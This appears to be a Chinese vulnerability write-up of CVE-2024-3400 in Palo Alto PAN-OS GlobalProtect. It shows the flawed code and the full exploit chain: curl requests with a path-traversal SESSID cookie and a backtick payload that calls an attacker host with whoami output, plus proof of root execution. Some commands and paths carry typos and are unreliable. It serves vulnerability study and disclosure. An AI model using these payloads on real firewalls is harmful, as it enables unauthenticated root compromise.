<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZfYLPXo1YZkAzbdrH2287Q)

  

**0x01 漏洞描述**
-------------

Palo Alto Networks 针对特定 PAN-OS 版本和不同功能配置的 PAN-OS 软件的 GlobalProtect 功能中存在命令注入漏洞，这可能使未经身份验证的攻击者能够在防火墙上以 root 权限执行任意代码。

仅适用于启用了 GlobalProtect gateway(Network> GlobalProtect > Gateways) 和 device telemetry(Device > Setup > Telemetry) 的 PAN-OS 10.2、PAN-OS 11.0 和 PAN-OS 11.1 防火墙。

**0x02 漏洞分析**
-------------

首先看影响版本的 **send_file** 函数，我们可以看到它的工作原理如下：

```
def send_file(logger, dbg, fname, dest_ip, key, signedUrl, capath):
    source_ip_str = get_source_ip(logger,dbg)
    if source_ip_str is not None and source_ip_str != "": 
        curl_cmd = "/usr/bin/curl -v -H \"Content-Type: application/octet-stream\" -X PUT \"%s\" --data-binary @%s --capath %s --interface %s" \
                     %(signedUrl, fname, capath, source_ip_str)
    else:
        curl_cmd = "/usr/bin/curl -v -H \"Content-Type: application/octet-stream\" -X PUT \"%s\" --data-binary @%s --capath %s" \
                     %(signedUrl, fname, capath)
    if dbg:
        logger.info("S2: XFILE: send_file: curl cmd: '%s'" %curl_cmd)
    stat, rsp, err, pid = pansys(curl_cmd, shell=True, timeout=250)


```

可以看到当通过 **pansys** 执行 **curl_cmd** 字符串时，传入 **fname** 变量的攻击者控制的文件名可能会被用来执行命令注入。

函数 pansys 来自库函数 pansys.pansys（）.dosys，该函数位于 / usr/lib64/python3.6/site-packages/pansys/pansys.py 中，具有以下代码：

```
    def dosys(self, command, close_fds=True, shell=False, timeout=30, first_wait=None):
        """call shell-command and either return its output or kill it
           if it doesn't normally exit within timeout seconds"""
    
        # Define dosys specific constants here
        PANSYS_POST_SIGKILL_RETRY_COUNT = 5

        # how long to pause between poll-readline-readline cycles
        PANSYS_DOSYS_PAUSE = 0.1

        # Use first_wait if time to complete is lengthy and can be estimated 
        if first_wait == None:
            first_wait = PANSYS_DOSYS_PAUSE

        # restrict the maximum possible dosys timeout
        PANSYS_DOSYS_MAX_TIMEOUT = 23 * 60 * 60
        # Can support upto 2GB per stream
        out = StringIO()
        err = StringIO()

        try:
            if shell:
                cmd = command
            else:
                cmd = command.split()
        except AttributeError: cmd = command

        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, bufsize=1, shell=shell,
                 stderr=subprocess.PIPE, close_fds=close_fds, universal_newlines=True)


```

我们可以看到命令字符串是通过 subprocess.Popen 执行的。shell 参数将为 True。这是不安全的，因为命令字符串将在 Linux shell 的上下文中执行，因此可以访问 shell 功能，如 backtick、pipes、重定向等，非常适合执行攻击者控制的输入。

### 任意文件创建

web 服务器为未经身份验证的会话设置 SESSID cookie，与会话 cookie 关联的数据位于 / tmp/sslvpn 中。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSf8HbYElicmltcL6DqwbTIF0UddxaxVMLDwLh9eq8yg88ldfIS6PKLM3lOEDic4nThFelEj3z8gw5A/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSf8HbYElicmltcL6DqwbTIF9UVEUkZRSPSzcU72qVichrToiaFq5TpibegqDz5PuQcLBdzy3tczsGibag/640?wx_fmt=png&from=appmsg)

由于 cookie 数据被附加到 session_字符串中，我们将尝试在 SESSID cookie 中发送不同的数据：  

```
curl https://hostname/global-protect/login.esp-k-H“Cookie:SESSSID=test_data”


```

检查 session 目录，确认我们的数据已写入！

```
$ ls -lha /tmp/sslvpn/session_test_data
-rw-------   1 root root    0 Apr 15 12:50 session_test_data


```

测试发现，通过目录穿越，可以完全避免 session_前缀，从而导致任意的空文件写入。请求类型可以是 GET 或 POST，只要它是对有效端点的结构正确的 HTTPS 请求即可。

```
curl https://hostname/global-protect/login.esp -k -H 'Cookie: SESSID=./../../../hello_as_root'


```

```
$ ls -lha /hello_as_root
-rw-------   1 root root    0 Apr 15 12:55 hello_as_root


```

### 命令注入

我们可以在文件系统的任何位置创建任意命名的空文件以 root 身份。由于我们还通过文件名参数确定了该服务易受命令注入的影响，因此我们可以开始将这些部分组合在一起。

该服务通过位于 **/etc/cron.d/device_telemetry_send 中的定时任务运行。

脚本 / usr/local/bin/dt_send 将在 / opt/panlogs/tmp/device_termetry/hour 和和 / opt/panlog/tmp/device_temetry/day 目录中读取新文件，然后通过 / usr/local/biin/dt_cURL** 脚本每小时将文件名包括在 cURL 请求中。

为了触发远程代码执行，我们向 web 服务器执行未经身份验证的 cURL 请求，SESSID cookie 值中包含 payload。当服务器每小时执行一次传输过程时，payload 将被执行并从目录中删除。

```
curl https://hostname/global-protect/login.esp -k -H 'Cookie: SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}attacker:4444?user=$(whoami)`'


```

经过短暂的等待，我们可以建立远程代码执行：

```
$ ps auxfw
[..]
/usr/bin/python -t /usr/local/bin/dt_curl -i 35.184.126.116 -f /opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}attacker:4444?user=$(whoami)`'


```

在攻击者机器上，Python web 服务器收到一个 GET 请求，表明我们的代码是用 root 权限执行的。

```
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
192.168.50.226 - - [15/Apr/2024 19:00:17] "GET /?user=root HTTP/1.1" 200 -


```

**0x03 影响版本**
-------------

PAN-OS 11.1 < 11.1.2-h3

PAN-OS 11.0 < 11.0.4-h1

PAN-OS 10.2 < 10.2.9-h1

**0x04 漏洞详情**
-------------

https://security.paloaltonetworks.com/CVE-2024-3400

**0x05 参考链接**
-------------

https://security.paloaltonetworks.com/CVE-2024-3400

CVE-2024-3400 （英语） | 攻击者 KB (attackerkb.com)

Palo Alto - 将 Protecc 纳入 GlobalProtect （CVE-2024-3400） (watchtowr.com)